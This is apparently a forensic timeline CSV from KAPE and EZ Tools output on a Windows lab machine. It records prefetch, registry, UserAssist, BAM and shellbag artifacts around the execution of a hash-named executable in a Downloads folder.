2025-05-03T03:45:03.6100381,Run Time,Prefetch,EZ Tools,Program Execution,NGEN.EXE,WINDOWS/MICROSOFT.NET/FRAMEWORK64/V4.0.30319/NGEN.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T03:42:08.0153291,Run Time,Prefetch,EZ Tools,Program Execution,PECMD.EXE,USERS/ADMIN0X/DESKTOP/KAPE/MODULES/BIN/PECMD.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T04:01:00.9088467,Run Time,Prefetch,EZ Tools,Program Execution,POWERSHELL.EXE,WINDOWS/SYSTEM32/WINDOWSPOWERSHELL/V1.0/POWERSHELL.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T04:00:57.1663519,Run Time,Prefetch,EZ Tools,Program Execution,POWERSHELL.EXE,WINDOWS/SYSTEM32/WINDOWSPOWERSHELL/V1.0/POWERSHELL.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T03:42:10.7021943,Run Time,Prefetch,EZ Tools,Program Execution,RBCMD.EXE,USERS/ADMIN0X/DESKTOP/KAPE/MODULES/BIN/RBCMD.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T03:42:12.7654644,Run Time,Prefetch,EZ Tools,Program Execution,RECMD.EXE,USERS/ADMIN0X/DESKTOP/KAPE/MODULES/BIN/RECMD/RECMD.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T03:42:29.4214497,Run Time,Prefetch,EZ Tools,Program Execution,SBECMD.EXE,USERS/ADMIN0X/DESKTOP/KAPE/MODULES/BIN/SBECMD.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T03:42:32.3739598,Run Time,Prefetch,EZ Tools,Program Execution,SQLECMD.EXE,USERS/ADMIN0X/DESKTOP/KAPE/MODULES/BIN/SQLECMD/SQLECMD.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T03:42:34.8116015,Run Time,Prefetch,EZ Tools,Program Execution,SRUMECMD.EXE,USERS/ADMIN0X/DESKTOP/KAPE/MODULES/BIN/SRUMECMD.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T03:42:37.5781164,Run Time,Prefetch,EZ Tools,Program Execution,SUMECMD.EXE,USERS/ADMIN0X/DESKTOP/KAPE/MODULES/BIN/SUMECMD.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-03T03:41:48.2961647,Run Time,Prefetch,EZ Tools,Program Execution,WXTCMD.EXE,USERS/ADMIN0X/DESKTOP/KAPE/MODULES/BIN/WXTCMD.EXE,,,,,,,,,,,ProgramExecution/20250503043844_PECmd_Output_Timeline.csv,
2025-05-02T13:56:38.6621995,Last Write,Registry,EZ Tools,Program Execution,AppCompatFlags,Path: C:/Users/admin0x/Downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe//,,,,,,,,,,,Registry/20250503043846_RECmd_Batch_Kroll_Batch_Output.csv,
2025-05-03T04:37:10.3108708,Last Write,Registry,EZ Tools,Program Execution,UserAssist,UEME_CTLSESSION/Last executed: /Run count: 103,,,,,,,,,,,Registry/20250503043846_RECmd_Batch_Kroll_Batch_Output.csv,
2025-05-03T04:37:10.3108708,Last Write,Registry,EZ Tools,Program Execution,UserAssist,Microsoft.Windows.Explorer/Last executed: 2025-05-03 04:00:33.9990000/Run count: 10,,,,,,,,,,,Registry/20250503043846_RECmd_Batch_Kroll_Batch_Output.csv,
2025-05-03T04:37:10.3108708,Last Write,Registry,EZ Tools,Program Execution,UserAssist,C:/Users/admin0x/Desktop/KAPE/gkape.exe/Last executed: 2025-05-03 04:36:00.4360000/Run count: 2,,,,,,,,,,,Registry/20250503043846_RECmd_Batch_Kroll_Batch_Output.csv,
2025-05-03T04:37:10.3108708,Last Write,Registry,EZ Tools,Program Execution,UserAssist,C:/Users/admin0x/Desktop/KAPE/kape.exe/Last executed: /Run count: 0,,,,,,,,,,,Registry/20250503043846_RECmd_Batch_Kroll_Batch_Output.csv,
2025-05-03T04:37:10.3108708,Last Write,Registry,EZ Tools,Program Execution,UserAssist,C:/Users/admin0x/Downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe/Last executed: 2025-05-03 04:00:53.4110000/Run count: 1,,,,,,,,,,,Registry/20250503043846_RECmd_Batch_Kroll_Batch_Output.csv,
2025-05-03T04:37:10.3108708,Last Write,Registry,EZ Tools,Program Execution,UserAssist,{System32}/WindowsPowerShell/v1.0/powershell.exe/Last executed: /Run count: 0,,,,,,,,,,,Registry/20250503043846_RECmd_Batch_Kroll_Batch_Output.csv,
2025-05-03T04:00:33.9993737,Last Write,Registry,EZ Tools,Program Execution,UserAssist,UEME_CTLSESSION/Last executed: /Run count: 28,,,,,,,,,,,Registry/20250503043846_RECmd_Batch_Kroll_Batch_Output.csv,
2025-05-03T04:00:33.9993737,Last Write,Registry,EZ Tools,Program Execution,UserAssist,{User Pinned}/TaskBar/File Explorer.lnk/Last executed: 2025-05-03 04:00:33.9990000/Run count: 10,,,,,,,,,,,Registry/20250503043846_RECmd_Batch_Kroll_Batch_Output.csv,
2025-05-03T04:00:33.9303483,Last Write,Registry,EZ Tools,User Activity,FeatureUsage,5//,,,,,,,,,,,Registry/20250503043846_RECmd_Batch_Kroll_Batch_Output.csv,
2025-05-03T03:51:59.2129094,Last Write,Registry,EZ Tools,Third Party Applications,7-Zip,Archive: C:/tr/tr.zip//,,,,,,,,,,,Registry/20250503043846_RECmd_Batch_Kroll_Batch_Output.csv,
2025-05-03T03:51:59.2129094,Last Write,Registry,EZ Tools,Third Party Applications,7-Zip,Archive: C:/tr.zip//,,,,,,,,,,,Registry/20250503043846_RECmd_Batch_Kroll_Batch_Output.csv,
2025-05-03T04:35:37.8589737,Last Write,Registry,EZ Tools,Cloud Storage,OneDrive,2025-05-03 04:35:37.0000000//,,,,,,,,,,,Registry/20250503043846_RECmd_Batch_Kroll_Batch_Output.csv,
2025-05-03T03:45:02.5476032,Last Write,Registry,EZ Tools,Autoruns,Scheduled Tasks (TaskCache),"Created on: 2025-05-02 15:48:41.1025801/Last start: 2025-05-03 03:45:02.2353128, Last stop: 2025-05-03 03:47:12.5496294/Path: /Microsoft/Windows/.NET Framework/.NET Framework NGEN v4.0.30319 64 Critical",,,,,,,,,,,Registry/20250503043846_RECmd_Batch_Kroll_Batch_Output.csv,
2025-05-03T03:45:02.5476032,Last Write,Registry,EZ Tools,Autoruns,Scheduled Tasks (TaskCache),"Created on: 2025-05-02 15:48:41.1962878/Last start: 2025-05-03 03:45:02.2353128, Last stop: /Path: /Microsoft/Windows/MemoryDiagnostic/RunFullMemoryDiagnostic",,,,,,,,,,,Registry/20250503043846_RECmd_Batch_Kroll_Batch_Output.csv,
2025-05-03T03:45:02.5476032,Last Write,Registry,EZ Tools,Autoruns,Scheduled Tasks (TaskCache),"Created on: 2025-05-02 15:48:40.3838343/Last start: 2025-05-03 04:15:02.6998651, Last stop: 2025-05-03 04:15:02.8094082/Path: /Microsoft/Windows/Autochk/Proxy",,,,,,,,,,,Registry/20250503043846_RECmd_Batch_Kroll_Batch_Output.csv,
2025-05-03T03:45:02.5476032,Last Write,Registry,EZ Tools,Autoruns,Scheduled Tasks (TaskCache),"Created on: 2025-05-02 15:48:41.8994176/Last start: 2025-05-03 04:22:31.0509591, Last stop: 2025-05-03 04:22:32.2531747/Path: /Microsoft/Windows/Flighting/OneSettings/RefreshCache",,,,,,,,,,,Registry/20250503043846_RECmd_Batch_Kroll_Batch_Output.csv,
2025-05-03T03:45:02.5476032,Last Write,Registry,EZ Tools,Autoruns,Scheduled Tasks (TaskCache),"Created on: 2025-05-02 15:48:42.1494626/Last start: 2025-05-03 03:45:02.2195350, Last stop: 2025-05-03 03:45:02.8914459/Path: /Microsoft/Windows/DeviceDirectoryClient/IntegrityCheck",,,,,,,,,,,Registry/20250503043846_RECmd_Batch_Kroll_Batch_Output.csv,
2025-05-03T03:45:02.5476032,Last Write,Registry,EZ Tools,Autoruns,Scheduled Tasks (TaskCache),"Created on: 2025-05-02 15:48:42.2587639/Last start: 2025-05-03 03:45:02.2353128, Last stop: /Path: /Microsoft/Windows/DiskCleanup/SilentCleanup",,,,,,,,,,,Registry/20250503043846_RECmd_Batch_Kroll_Batch_Output.csv,
2025-05-03T03:45:02.5476032,Last Write,Registry,EZ Tools,Autoruns,Scheduled Tasks (TaskCache),"Created on: 2025-05-02 15:48:40.4150672/Last start: 2025-05-03 04:27:46.9578180, Last stop: 2025-05-03 04:27:47.0832004/Path: /Microsoft/Windows/Windows Error Reporting/QueueReporting",,,,,,,,,,,Registry/20250503043846_RECmd_Batch_Kroll_Batch_Output.csv,
2025-05-03T03:45:02.5476032,Last Write,Registry,EZ Tools,Autoruns,Scheduled Tasks (TaskCache),"Created on: 2025-05-02 15:48:42.4931507/Last start: 2025-05-03 03:42:52.8899017, Last stop: 2025-05-03 03:42:53.0149243/Path: /Microsoft/Windows/Feedback/Siuf/DmClientOnScenarioDownload",,,,,,,,,,,Registry/20250503043846_RECmd_Batch_Kroll_Batch_Output.csv,
2025-05-03T03:45:02.5476032,Last Write,Registry,EZ Tools,Autoruns,Scheduled Tasks (TaskCache),"Created on: 2025-05-02 15:48:42.5400330/Last start: 2025-05-03 03:45:02.2353128, Last stop: /Path: /Microsoft/Windows/MemoryDiagnostic/ProcessMemoryDiagnosticEvents",,,,,,,,,,,Registry/20250503043846_RECmd_Batch_Kroll_Batch_Output.csv,
2025-05-03T03:45:02.5476032,Last Write,Registry,EZ Tools,Autoruns,Scheduled Tasks (TaskCache),"Created on: 2025-05-02 15:48:40.8681509/Last start: 2025-05-03 03:45:02.3445316, Last stop: 2025-05-03 03:45:03.1413380/Path: /Microsoft/Windows/LanguageComponentsInstaller/Installation",,,,,,,,,,,Registry/20250503043846_RECmd_Batch_Kroll_Batch_Output.csv,
2025-05-03T03:45:02.5476032,Last Write,Registry,EZ Tools,Autoruns,Scheduled Tasks (TaskCache),"Created on: 2025-05-02 15:48:40.8681509/Last start: 2025-05-03 03:45:02.2038999, Last stop: 2025-05-03 03:45:08.4078557/Path: /Microsoft/Windows/Management/Provisioning/Logon",,,,,,,,,,,Registry/20250503043846_RECmd_Batch_Kroll_Batch_Output.csv,
2025-05-03T03:45:02.5476032,Last Write,Registry,EZ Tools,Autoruns,Scheduled Tasks (TaskCache),"Created on: 2025-05-02 15:48:56.7342814/Last start: 2025-05-03 04:10:52.7427964, Last stop: 2025-05-03 04:10:52.9145099/Path: /MicrosoftEdgeUpdateTaskMachineUA",,,,,,,,,,,Registry/20250503043846_RECmd_Batch_Kroll_Batch_Output.csv,
2025-05-03T03:45:02.5476032,Last Write,Registry,EZ Tools,Autoruns,Scheduled Tasks (TaskCache),"Created on: 2025-05-02 15:48:43.3994507/Last start: 2025-05-03 03:45:02.2353128, Last stop: 2025-05-03 03:47:12.1749101/Path: /Microsoft/Windows/.NET Framework/.NET Framework NGEN v4.0.30319 Critical",,,,,,,,,,,Registry/20250503043846_RECmd_Batch_Kroll_Batch_Output.csv,
2025-05-03T03:45:02.5476032,Last Write,Registry,EZ Tools,Autoruns,Scheduled Tasks (TaskCache),"Created on: 2025-04-27 03:45:02.5631902/Last start: , Last stop: /Path: /Microsoft/Windows/Defrag/ScheduledDefrag",,,,,,,,,,,Registry/20250503043846_RECmd_Batch_Kroll_Batch_Output.csv,
2025-05-03T03:45:02.5476032,Last Write,Registry,EZ Tools,Autoruns,Scheduled Tasks (TaskCache),"Created on: 2025-05-02 15:48:41.0088475/Last start: 2025-05-03 03:47:02.7063794, Last stop: 2025-05-03 03:47:03.1109901/Path: /Microsoft/Windows/Device Information/Device User",,,,,,,,,,,Registry/20250503043846_RECmd_Batch_Kroll_Batch_Output.csv,
2025-05-03T04:31:20.8525537,Last Write,Registry,EZ Tools,System Info,Network Configuration (IPv4),2025-05-03 04:31:20.0000000//,,,,,,,,,,,Registry/20250503043846_RECmd_Batch_Kroll_Batch_Output.csv,
2025-05-03T04:31:20.8525537,Last Write,Registry,EZ Tools,System Info,Network Configuration (IPv4),2025-05-03 05:01:20.0000000//,,,,,,,,,,,Registry/20250503043846_RECmd_Batch_Kroll_Batch_Output.csv,
2025-05-03T04:31:20.8525537,Last Write,Registry,EZ Tools,System Info,Network Configuration (IPv4),1746247580//,,,,,,,,,,,Registry/20250503043846_RECmd_Batch_Kroll_Batch_Output.csv,
2025-05-03T04:31:20.8525537,Last Write,Registry,EZ Tools,System Info,Network Configuration (IPv4),1746248255//,,,,,,,,,,,Registry/20250503043846_RECmd_Batch_Kroll_Batch_Output.csv,
2025-05-03T04:36:22.0744572,Last Write,Registry,EZ Tools,Program Execution,Background Activity Moderator (BAM),Program: Microsoft.Windows.Search_cw5n1h2txyewy/Execution time: 2025-05-03 04:36:22.0744572/,,,,,,,,,,,Registry/20250503043846_RECmd_Batch_Kroll_Batch_Output.csv,
2025-05-03T04:36:22.0744572,Last Write,Registry,EZ Tools,Program Execution,Background Activity Moderator (BAM),Program: /Device/HarddiskVolume3/Program Files (x86)/Microsoft/Edge/Application/msedge.exe/Execution time: 2025-05-03 04:35:48.5926936/,,,,,,,,,,,Registry/20250503043846_RECmd_Batch_Kroll_Batch_Output.csv,
2025-05-03T04:36:22.0744572,Last Write,Registry,EZ Tools,Program Execution,Background Activity Moderator (BAM),Program: /Device/HarddiskVolume3/Program Files/7-Zip/7zG.exe/Execution time: 2025-05-03 04:35:55.7490329/,,,,,,,,,,,Registry/20250503043846_RECmd_Batch_Kroll_Batch_Output.csv,
2025-05-03T04:36:22.0744572,Last Write,Registry,EZ Tools,Program Execution,Background Activity Moderator (BAM),Program: /Device/HarddiskVolume3/Users/admin0x/Desktop/KAPE/gkape.exe/Execution time: 2025-05-03 04:36:08.5272910/,,,,,,,,,,,Registry/20250503043846_RECmd_Batch_Kroll_Batch_Output.csv,
2025-05-03T04:36:22.0744572,Last Write,Registry,EZ Tools,Program Execution,Background Activity Moderator (BAM),Program: /Device/HarddiskVolume3/Users/admin0x/Desktop/KAPE/kape.exe/Execution time: 2025-05-03 03:51:14.4729726/,,,,,,,,,,,Registry/20250503043846_RECmd_Batch_Kroll_Batch_Output.csv,
2025-05-03T04:36:22.0744572,Last Write,Registry,EZ Tools,Program Execution,Background Activity Moderator (BAM),Program: /Device/HarddiskVolume3/Users/admin0x/Downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe/Execution time: 2025-05-03 04:01:24.1463533/,,,,,,,,,,,Registry/20250503043846_RECmd_Batch_Kroll_Batch_Output.csv,
2025-05-03T04:36:22.0744572,Last Write,Registry,EZ Tools,Program Execution,Background Activity Moderator (BAM),Program: /Device/HarddiskVolume3/Windows/System32/WindowsPowerShell/v1.0/powershell.exe/Execution time: 2025-05-03 04:01:25.7048471/,,,,,,,,,,,Registry/20250503043846_RECmd_Batch_Kroll_Batch_Output.csv,
2025-05-03T03:36:23.1626168,Last Write,Registry,EZ Tools,Services,Services,"Name: BITS Desc: @%SystemRoot%/system32/qmgr.dll,-1001/Name last write: 2025-05-03 04:35:28.0452815, Parameters last write: 2019-12-07 09:15:07.8307671/Image path: %SystemRoot%/System32/svchost.exe -k netsvcs -p ServiceDLL: %SystemRoot%/System32/qmgr.dll",,,,,,,,,,,Registry/20250503043846_RECmd_Batch_Kroll_Batch_Output.csv,
2025-05-03T04:00:43.0000000,Last Write,Shellbags,EZ Tools,File & Folder Access,Documents,Desktop/My Computer/Documents,,,,,,,,,,,FileFolderAccess/admin0x_UsrClass.csv,
2025-05-03T04:00:43.0000000,First Interacted,Shellbags,EZ Tools,File & Folder Access,Documents,Desktop/My Computer/Documents,,,,,,,,,,,FileFolderAccess/admin0x_UsrClass.csv,
2025-05-03T04:00:47.0000000,Last Write,Shellbags,EZ Tools,File & Folder Access,479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213,Desktop/My Computer/Downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213,,,,,,,,,,,FileFolderAccess/admin0x_UsrClass.csv,
2025-05-03T04:00:47.0000000,First Interacted,Shellbags,EZ Tools,File & Folder Access,479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213,Desktop/My Computer/Downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213,,,,,,,,,,,FileFolderAccess/admin0x_UsrClass.csv,
2025-05-03T04:00:47.0000000,Last Interacted,Shellbags,EZ Tools,File & Folder Access,479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213,Desktop/My Computer/Downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213,,,,,,,,,,,FileFolderAccess/admin0x_UsrClass.csv,
2025-05-03T03:51:49.0000000,Last Write,Shellbags,EZ Tools,File & Folder Access,tr,Desktop/My Computer/C:/tr,,,,,,,,,,,FileFolderAccess/admin0x_UsrClass.csv,
2025-05-03T03:51:49.0000000,First Interacted,Shellbags,EZ Tools,File & Folder Access,tr,Desktop/My Computer/C:/tr,,,,,,,,,,,FileFolderAccess/admin0x_UsrClass.csv,
2025-05-03T03:51:49.0000000,Last Interacted,Shellbags,EZ Tools,File & Folder Access,tr,Desktop/My Computer/C:/tr,,,,,,,,,,,FileFolderAccess/admin0x_UsrClass.csv,
2025-05-03T04:00:53.4110000,Last Executed,Registry,EZ Tools,UserAssist,C:/Users/admin0x/Downloads/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213/479b3c923be6125530e99f24e611547aa5d8861d1e88b75a03ce5527a2052213.exe,P:/Hfref/nqzva0k/Qbjaybnqf/479o3p923or6125530r99s24r611547nn5q8861q1r88o75n03pr5527n2052213/479o3p923or6125530r99s24r611547nn5q8861q1r88o75n03pr5527n2052213.rkr,,,,,,,,,,1,ROOT/SOFTWARE/Microsoft/Windows/CurrentVersion/Explorer/UserAssist/{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}/Count,
